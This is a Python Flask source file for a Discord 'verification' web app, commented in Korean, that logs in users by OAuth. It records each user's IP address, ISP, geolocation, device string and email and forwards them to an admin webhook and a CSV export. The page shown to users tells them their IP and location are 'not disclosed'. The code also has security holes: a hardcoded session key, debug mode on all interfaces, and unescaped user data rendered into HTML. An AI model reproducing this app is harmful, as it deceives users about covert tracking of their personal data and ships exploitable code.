import os
import re
import sqlite3
import requests
import csv
from io import StringIO
from flask import Flask, redirect, url_for, session, request, render_template_string, make_response
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = "secure_dashboard_secret_key_string_!@#$"

# ✅ 세션 보안 강화 설정
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)
app.config['SESSION_COOKIE_SECURE'] = False

# =========================================================================
# ✅ [여기를 본인 정보로 정확히 채우세요!]
# =========================================================================
CLIENT_ID = "여기에_디스코드_CLIENT_ID_입력"
CLIENT_SECRET = "여기에_디스코드_CLIENT_SECRET_입력"
DISCORD_WEBHOOK_URL = "여기에_관리자_채널_웹훅_URL_입력"
DISCORD_BOT_TOKEN = "여기에_디스코드_봇_TOKEN_입력"
GUILD_ID = "여기에_서버_ID_입력"
VERIFIED_ROLE_ID = "여기에_인증완료_ROLE_ID_입력"
REDIRECT_URI = "https://kill-xgmz.onrender.com/callback"

# ✅ 일반 유저에게 보여줄 메시지 (이미지 스타일)
DEFAULT_WELCOME_MESSAGE = """✅ {username}님이 인증을 완료하였습니다.

▸ 유저 닉네임: {username}
▸ 유저 아이디: {user_id}
▸ 유저 이메일: {email}

▸ 인증한 서버: {server_name}

▸ 유저 아이피: 공개되지 않음
▸ 사용 통신사: 공개되지 않음
▸ 예상 지역: 공개되지 않음

▸ 유저의 기기:
기기 정보는 관리자만 확인할 수 있습니다.

문제가 있으시면 관리자에게 문의하세요."""
# =========================================================================

DISCORD_AUTH_URL = (
    f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}"
    f"&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds.join&prompt=consent"
)
DISCORD_TOKEN_URL = "https://discord.com/api/oauth2/token"
DISCORD_USER_URL = "https://discord.com/api/users/@me"

# ✅ DB 초기화
def init_db():
    conn = sqlite3.connect("management.db")
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS verified_users (
            discord_id TEXT PRIMARY KEY,
            username TEXT NOT NULL,
            email TEXT,
            ip_address TEXT,
            isp TEXT,
            location TEXT,
            user_agent TEXT,
            verified_role_given INTEGER DEFAULT 0,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT NOT NULL
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS blacklist (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            discord_id TEXT,
            ip_address TEXT,
            reason TEXT,
            blocked_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('welcome_message', ?)", (DEFAULT_WELCOME_MESSAGE,))
    
    conn.commit()
    conn.close()

def get_setting(key, default=None):
    conn = sqlite3.connect("management.db")
    cursor = conn.cursor()
    cursor.execute("SELECT value FROM settings WHERE key = ?", (key,))
    row = cursor.fetchone()
    conn.close()
    return row[0] if row else default

def set_setting(key, value):
    conn = sqlite3.connect("management.db")
    cursor = conn.cursor()
    cursor.execute("REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

# ✅ 블랙리스트 확인
def is_blacklisted(discord_id=None, ip_address=None):
    conn = sqlite3.connect("management.db")
    cursor = conn.cursor()
    if discord_id:
        cursor.execute("SELECT 1 FROM blacklist WHERE discord_id = ?", (discord_id,))
        if cursor.fetchone():
            conn.close()
            return True
    if ip_address:
        cursor.execute("SELECT 1 FROM blacklist WHERE ip_address = ?", (ip_address,))
        if cursor.fetchone():
            conn.close()
            return True
    conn.close()
    return False

# ✅ 역할 자동 부여
def give_role_to_user(discord_id):
    if not DISCORD_BOT_TOKEN or "여기에_" in DISCORD_BOT_TOKEN:
        return False
    if not GUILD_ID or "여기에_" in GUILD_ID:
        return False
    if not VERIFIED_ROLE_ID or "여기에_" in VERIFIED_ROLE_ID:
        return False
    try:
        url = f"https://discord.com/api/v10/guilds/{GUILD_ID}/members/{discord_id}/roles/{VERIFIED_ROLE_ID}"
        headers = {"Authorization": f"Bot {DISCORD_BOT_TOKEN}"}
        res = requests.put(url, headers=headers)
        return res.status_code in [200, 201, 204]
    except:
        return False

def save_user_to_db(user_data, ip, isp, location, ua, role_given=0):
    conn = sqlite3.connect("management.db")
    cursor = conn.cursor()
    email = user_data.get('email', '공개되지 않음') if user_data.get('verified') else '인증되지 않음'
    cursor.execute('''
        INSERT OR REPLACE INTO verified_users 
        (discord_id, username, email, ip_address, isp, location, user_agent, verified_role_given, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
    ''', (user_data['id'], user_data['username'], email, ip, isp, location, ua, role_given))
    conn.commit()
    conn.close()

# ✅ 관리자에게 보내는 웹훅 (전체 정보 포함)
def send_admin_webhook(user_data, ip, isp, location, user_agent, is_vpn=False, role_given=False):
    if not DISCORD_WEBHOOK_URL or "여기에_" in DISCORD_WEBHOOK_URL:
        return
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    user_email = user_data.get('email', '공개되지 않음')

    if is_vpn:
        title = "🚨 [우회 감지] VPN/프록시 접속 시도"
        color = 15158332
    else:
        title = "✅ 인증 완료 - 전체 정보"
        color = 5763719

    role_text = "✅ 역할 부여 완료" if role_given else "⚠️ 역할 부여되지 않음"
    embed = {
        "title": title,
        "color": color,
        "fields": [
            {"name": "👤 유저 닉네임", "value": f"`{user_data.get('username')}`", "inline": True},
            {"name": "🆔 유저 아이디", "value": f"`{user_data.get('id')}`", "inline": True},
            {"name": "📧 이메일", "value": f"`{user_email}`", "inline": False},
            {"name": "🌐 IP 주소", "value": f"`{ip}`", "inline": True},
            {"name": "🏢 통신사", "value": f"`{isp}`", "inline": True},
            {"name": "📍 위치", "value": f"`{location}`", "inline": False},
            {"name": "📱 기기 정보", "value": f"```\n{user_agent[:300]}\n```", "inline": False},
            {"name": "🎭 역할 부여", "value": role_text, "inline": True}
        ],
        "footer": {"text": f"인증 시간: {current_time}"}
    }
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]}, timeout=5)
    except:
        pass

@app.before_request
def make_session_permanent():
    session.permanent = True

# ✅ 관리자 권한 확인
def is_admin_user(user):
    try:
        if DISCORD_WEBHOOK_URL and "여기에_" not in DISCORD_WEBHOOK_URL:
            webhook_info = requests.get(DISCORD_WEBHOOK_URL.split('/')[0] + '//' + DISCORD_WEBHOOK_URL.split('/')[2] + '/api/webhooks/' + '/'.join(DISCORD_WEBHOOK_URL.split('/')[4:]), timeout=3).json()
            creator_id = webhook_info.get('user', {}).get('id')
            if creator_id and str(user.get('id')) == str(creator_id):
                return True
    except:
        pass
    return False

@app.route('/')
def index():
    ua = request.headers.get("User-Agent", "")
    if re.search(r'bot|Discord|robot|spider|crawler|^$', ua, re.IGNORECASE):
        return "자동화 요청 거부", 403
        
    if 'user' in session:
        return '''
        <div style="text-align:center; font-family:sans-serif; margin-top:100px;">
            <h3>✅ 이미 인증 완료된 상태입니다</h3>
            <a href="/dashboard" style="color:#5865F2; font-weight:bold; text-decoration:none; margin:0 10px;">📊 대시보드</a>
            <a href="/settings" style="color:#2ecc71; font-weight:bold; text-decoration:none; margin:0 10px;">⚙️ 설정</a>
            <a href="/logout" style="color:gray; text-decoration:none; margin:0 10px;">🚪 로그아웃</a>
        </div>
        '''
    
    return f'''
    <div style="text-align:center; margin-top:100px; font-family:sans-serif;">
        <h2 style="color:#2c3e50;">🛡️ 서버 인증 시스템</h2>
        <p style="color:#7f8c8d;">아래 버튼을 눌러 디스코드로 인증을 완료해주세요.</p>
        <a href="{DISCORD_AUTH_URL}" style="display:inline-block; background:#5865F2; color:white; padding:14px 32px; border-radius:8px; text-decoration:none; font-weight:bold; margin-top:20px;">✅ 디스코드로 인증하기</a>
    </div>
    '''

# ✅ 설정 페이지
@app.route('/settings', methods=['GET', 'POST'])
def settings():
    if 'user' not in session:
        return redirect(url_for('index'))
    user = session['user']
    if not is_admin_user(user):
        return "<div style='text-align:center; margin-top:100px; color:red;'>⚠️ 관리자만 접근 가능합니다</div>", 403
    
    if request.method == 'POST':
        set_setting('welcome_message', request.form.get('welcome_message', ''))
        return redirect(url_for('settings'))
    
    msg = get_setting('welcome_message', DEFAULT_WELCOME_MESSAGE)
    return f'''
    <div style="max-width:800px; margin:30px auto; font-family:sans-serif; padding:20px;">
        <h2 style="color:#2ecc71;">⚙️ 인증 페이지 설정</h2>
        <form method="post">
            <label style="font-weight:bold; display:block; margin:15px 0 5px;">일반 유저에게 보여줄 메시지</label>
            <textarea name="welcome_message" style="width:100%; height:280px; padding:12px; border-radius:6px; border:1px solid #ccc; font-size:14px; line-height:1.6;">{msg}</textarea>
            <p style="font-size:12px; color:#666;">사용가능 변수: {'{username}'}, {'{user_id}'}, {'{email}'}, {'{server_name}'}</p>
            <button type="submit" style="background:#2ecc71; color:white; border:none; padding:10px 24px; border-radius:6px; font-weight:bold; margin-top:10px; cursor:pointer;">💾 저장</button>
        </form>
    </div>
    '''

# ✅ 블랙리스트 관리 페이지
@app.route('/blacklist', methods=['GET', 'POST'])
def blacklist():
    if 'user' not in session or not is_admin_user(session['user']):
        return redirect(url_for('index'))
    
    conn = sqlite3.connect("management.db")
    cursor = conn.cursor()
    if request.method == 'POST':
        d_id = request.form.get('discord_id','').strip()
        ip_addr = request.form.get('ip_address','').strip()
        reason = request.form.get('reason','')
        if d_id or ip_addr:
            cursor.execute("INSERT INTO blacklist (discord_id, ip_address, reason) VALUES (?, ?, ?)", (d_id if d_id else None, ip_addr if ip_addr else None, reason))
            conn.commit()
        # 삭제
        if request.form.get('del_id'):
            cursor.execute("DELETE FROM blacklist WHERE id = ?", (request.form.get('del_id'),))
            conn.commit()
    
    cursor.execute("SELECT * FROM blacklist ORDER BY blocked_at DESC")
    list_data = cursor.fetchall()
    conn.close()
    
    html = '''
    <div style="max-width:900px; margin:30px auto; font-family:sans-serif; padding:20px;">
        <h2 style="color:#e74c3c;">🚫 블랙리스트 관리</h2>
        <form method="post" style="background:#fef0f0; padding:20px; border-radius:8px; margin-bottom:20px;">
            <div style="margin:8px 0;">
                <label>디스코드 ID:</label>
                <input name="discord_id" style="width:100%; padding:8px; border-radius:4px; border:1px solid #ccc;">
            </div>
            <div style="margin:8px 0;">
                <label>IP 주소:</label>
                <input name="ip_address" style="width:100%; padding:8px; border-radius:4px; border:1px solid #ccc;">
            </div>
            <div style="margin:8px 0;">
                <label>사유:</label>
                <input name="reason" style="width:100%; padding:8px; border-radius:4px; border:1px solid #ccc;">
            </div>
            <button type="submit" style="background:#e74c3c; color:white; border:none; padding:8px 16px; border-radius:4px; font-weight:bold;">🚫 추가</button>
        </form>
        <table style="width:100%; border-collapse:collapse; font-size:13px;">
            <tr style="background:#eee;">
                <th style="padding:8px; border:1px solid #ddd;">ID</th>
                <th style="padding:8px; border:1px solid #ddd;">디스코드ID</th>
                <th style="padding:8px; border:1px solid #ddd;">IP</th>
                <th style="padding:8px; border:1px solid #ddd;">사유</th>
                <th style="padding:8px; border:1px solid #ddd;">차단일시</th>
                <th style="padding:8px; border:1px solid #ddd;">삭제</th>
            </tr>
    '''
    for row in list_data:
        html += f'''
            <tr>
                <td style="padding:6px; border:1px solid #ddd;">{row[0]}</td>
                <td style="padding:6px; border:1px solid #ddd;">{row[2] or '-'}</td>
                <td style="padding:6px; border:1px solid #ddd;">{row[3] or '-'}</td>
                <td style="padding:6px; border:1px solid #ddd;">{row[4]}</td>
                <td style="padding:6px; border:1px solid #ddd;">{row[5]}</td>
                <td style="padding:6px; border:1px solid #ddd;">
                    <form method="post" style="margin:0;">
                        <input type="hidden" name="del_id" value="{row[0]}">
                        <button type="submit" style="background:#ccc; border:none; border-radius:4px; cursor:pointer;">삭제</button>
                    </form>
                </td>
            </tr>
        '''
    html += '</table></div>'
    return html

# ✅ CSV 다운로드
@app.route('/export')
def export_csv():
    if 'user' not in session or not is_admin_user(session['user']):
        return redirect(url_for('index'))
    
    conn = sqlite3.connect("management.db")
    cursor = conn.cursor()
    cursor.execute("SELECT discord_id, username, email, ip_address, isp, location, created_at FROM verified_users ORDER BY created_at DESC")
    users = cursor.fetchall()
    conn.close()
    
    output = StringIO()
    writer = csv.writer(output)
    writer.writerow(['디스코드ID','닉네임','이메일','IP주소','통신사','위치','인증일시'])
    writer.writerows(users)
    
    res = make_response(output.getvalue())
    res.headers["Content-Disposition"] = "attachment; filename=verified_users.csv"
    res.headers["Content-type"] = "text/csv; charset=utf-8-sig"
    return res

# ✅ 콜백
@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "인증 실패", 400

    try:
        ip_addr = request.headers.get("X-Forwarded-For", request.remote_addr).split(',')[0].strip()
        user_agent = request.headers.get("User-Agent", "Unknown")

        # 블랙리스트 확인
        if is_blacklisted(ip_address=ip_addr):
            return '''
            <div style="text-align:center; margin-top:100px; font-family:sans-serif;">
                <h2 style="color:red;">🚫 인증이 거부되었습니다</h2>
                <p>차단된 IP에서 접속하셨습니다.</p>
            </div>
            ''', 403

        # 토큰 받기
        token_res = requests.post(DISCORD_TOKEN_URL, data={
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': REDIRECT_URI
        }).json()

        if 'access_token' not in token_res:
            return f"토큰 오류: {token_res}", 400

        # 유저 정보 가져오기
        headers = {"Authorization": f"Bearer {token_res['access_token']}"}
        user_data = requests.get(DISCORD_USER_URL, headers=headers).json()

        # 블랙리스트 확인 (디스코드 ID)
        if is_blacklisted(discord_id=user_data.get('id')):
            return '''
            <div style="text-align:center; margin-top:100px; font-family:sans-serif;">
                <h2 style="color:red;">🚫 인증이 거부되었습니다</h2>
                <p>차단된 계정입니다.</p>
            </div>
            ''', 403

        # IP 정보 조회
        analysis_ip = ip_addr if ip_addr not in ['127.0.0.1','::1','localhost'] else '8.8.8.8'
        country, city, isp_name = "알 수 없음", "", "알 수 없음"
        vpn_detected = False

        try:
            ipinfo = requests.get(f"http://ip-api.com/json/{analysis_ip}?fields=status,country,regionName,city,isp,proxy,hosting", timeout=4).json()
            if ipinfo.get('status') == 'success':
                country = ipinfo.get('country', '알 수 없음')
                city = ipinfo.get('city', '')
                isp_name = ipinfo.get('isp', '알 수 없음')
                vpn_detected = bool(ipinfo.get('proxy') or ipinfo.get('hosting'))
        except:
            pass

        if vpn_detected:
            send_admin_webhook(user_data, ip_addr, isp_name, f"{country} {city}", user_agent, is_vpn=True)
            return '''
            <div style="text-align:center; margin-top:100px; font-family:sans-serif;">
                <h2 style="color:#e74c3c;">⚠️ VPN/프록시가 감지되었습니다</h2>
                <p>일반 인터넷 환경에서 다시 시도해주세요.</p>
            </div>
            ''', 403

        # 역할 부여
        role_given = give_role_to_user(user_data.get('id'))

        # DB 저장
        save_user_to_db(user_data, ip_addr, isp_name, f"{country} {city}", user_agent, 1 if role_given else 0)

        # 관리자에게 전체 정보 전송
        send_admin_webhook(user_data, ip_addr, isp_name, f"{country} {city}", user_agent, role_given=role_given)

        # 세션에 유저 정보 저장
        session['user'] = {
            'id': user_data.get('id'),
            'username': user_data.get('username'),
            'email': user_data.get('email')
        }

        return redirect(url_for('dashboard'))

    except Exception as e:
        return f"오류: {e}"

# ✅ 대시보드
@app.route('/dashboard')
def dashboard():
    if 'user' not in session:
        return redirect(url_for('index'))
    
    user = session['user']
    is_admin = is_admin_user(user)

    if is_admin:
        conn = sqlite3.connect("management.db")
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM verified_users")
        total = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM verified_users WHERE DATE(created_at) = DATE('now')")
        today = cursor.fetchone()[0]
        cursor.execute("SELECT * FROM verified_users ORDER BY created_at DESC")
        users = cursor.fetchall()
        conn.close()

        html = f'''
        <div style="max-width:1200px; margin:0 auto; font-family:sans-serif; padding:20px;">
            <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:2px solid #ed4245; padding-bottom:10px;">
                <h2 style="color:#ed4245; margin:0;">👑 관리자 대시보드</h2>
                <div>
                    <strong>{user['username']}</strong>
                    <a href="/settings" style="color:#2ecc71; margin:0 10px; text-decoration:none;">⚙️ 설정</a>
                    <a href="/blacklist" style="color:#e74c3c; margin:0 10px; text-decoration:none;">🚫 블랙리스트</a>
                    <a href="/export" style="color:#3498db; margin:0 10px; text-decoration:none;">📥 CSV내보내기</a>
                    <a href="/logout" style="color:gray; margin:0 10px; text-decoration:none;">로그아웃</a>
                </div>
            </div>

            <div style="display:flex; gap:20px; margin:20px 0;">
                <div style="flex:1; background:#f8f8f8; padding:15px; border-radius:8px; text-align:center;">
                    <div style="font-size:28px; font-weight:bold; color:#ed4245;">{total}</div>
                    <div style="color:#666;">총 인증자</div>
                </div>
                <div style="flex:1; background:#f8f8f8; padding:15px; border-radius:8px; text-align:center;">
                    <div style="font-size:28px; font-weight:bold; color:#3498db;">{today}</div>
                    <div style="color:#666;">오늘 인증자</div>
                </div>
            </div>

            <table style="width:100%; border-collapse:collapse; font-size:12px; margin-top:15px;">
                <thead>
                    <tr style="background:#2c3e50; color:white;">
                        <th style="padding:8px; border:1px solid #ddd;">닉네임</th>
                        <th style="padding:8px; border:1px solid #ddd;">ID</th>
                        <th style="padding:8px; border:1px solid #ddd;">이메일</th>
                        <th style="padding:8px; border:1px solid #ddd;">IP</th>
                        <th style="padding:8px; border:1px solid #ddd;">위치/통신사</th>
                        <th style="padding:8px; border:1px solid #ddd;">역할</th>
                        <th style="padding:8px; border:1px solid #ddd;">일시</th>
                    </tr>
                </thead>
                <tbody>
        '''
        for u in users:
            html += f'''
                <tr>
                    <td style="padding:6px; border:1px solid #ddd; font-weight:bold;">{u[1]}</td>
                    <td style="padding:6px; border:1px solid #ddd;"><code>{u[0]}</code></td>
                    <td style="padding:6px; border:1px solid #ddd; color:#9933ff;"><code>{u[2]}</code></td>
                    <td style="padding:6px; border:1px solid #ddd; color:#e74c3c;"><code>{u[3]}</code></td>
                    <td style="padding:6px; border:1px solid #ddd; font-size:11px;">{u[5]}<br>{u[4]}</td>
                    <td style="padding:6px; border:1px solid #ddd; text-align:center;">{'✅' if u[7] else '❌'}</td>
                    <td style="padding:6px; border:1px solid #ddd; font-size:11px;">{u[8]}</td>
                </tr>
            '''
        html += '</tbody></table></div>'
        return html

    else:
        # ✅ 일반 유저 - 이미지 스타일 메시지 보여주기
        welcome_msg = get_setting('welcome_message', DEFAULT_WELCOME_MESSAGE)
        welcome_msg = welcome_msg.replace('{username}', user.get('username', ''))
        welcome_msg = welcome_msg.replace('{user_id}', user.get('id', ''))
        welcome_msg = welcome_msg.replace('{email}', user.get('email', ''))
        welcome_msg = welcome_msg.replace('{server_name}', '당신의 서버 이름')
        display_msg = welcome_msg.replace('\n', '<br>')

        return f'''
        <div style="max-width:520px; margin:80px auto; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background:#202225; color:#dcddde; border-radius:8px; padding:20px; line-height:1.6;">
            <div style="font-size:15px; white-space:pre-wrap;">{display_msg}</div>
            <div style="margin-top:25px; padding-top:15px; border-top:1px solid #2f3136; text-align:center;">
                <a href="/logout" style="color:#00aff4; text-decoration:none; font-size:14px;">로그아웃</a>
            </div>
        </div>
        '''

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

if __name__ == '__main__':
    init_db()
    print("✅ 인증 시스템 시작: http://localhost:5000")
    app.run(host='0.0.0.0', port=5000, debug=True)
